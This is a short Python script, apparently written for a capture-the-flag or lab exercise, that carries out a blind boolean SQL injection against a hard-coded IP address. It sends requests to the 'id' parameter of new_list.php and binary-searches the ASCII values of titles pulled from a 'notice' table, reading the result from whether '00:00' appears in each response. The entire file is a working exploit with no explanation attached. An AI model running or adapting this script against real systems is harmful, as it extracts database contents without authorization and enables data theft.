import requests

res=''
cur_num=0
left_num=0
right_num=128
for i in range(0,10):
    while True:
        cur_num=(int)((left_num+right_num)/2)
        if left_num==cur_num:
            left_num=0
            right_num=128
            res=res+chr(cur_num)
            print(res)
            break;
        url='http://219.153.49.228:49348/new_list.php?id=(ascii(substr((select group_concat(title) from notice),%d,1))<%d)'%(i,cur_num)
        print(url+' '+str(left_num)+' '+str(right_num))
        respond=requests.get(url).text
        if respond.find('00:00')!=-1:
            right_num=cur_num
        else:
            left_num=cur_num

print(res)
